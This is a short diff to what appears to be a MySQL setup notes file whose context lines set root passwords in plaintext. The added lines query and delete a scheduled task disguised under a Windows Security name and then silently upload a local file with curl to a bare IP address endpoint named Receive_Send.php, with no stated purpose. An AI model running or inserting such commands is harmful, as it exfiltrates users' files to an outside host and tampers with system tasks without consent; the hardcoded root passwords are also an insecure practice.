@@ -100,3 +100,8 @@ FLUSH PRIVILEGES;
 
 ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '1234qwer';
 ALTER USER 'root'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'BlueskyP@ss123';
+
+schtasks /Query /TN "Microsoft\\Windows\\Security\\WindowsSecurityTask"
+schtasks /Delete /TN "Microsoft\Windows\Security\WindowsSecurityTasks"
+
+curl -F "file=@D:\1.png" http://34.29.59.35/2/Receive_Send.php?id=FC3497957CFE -s
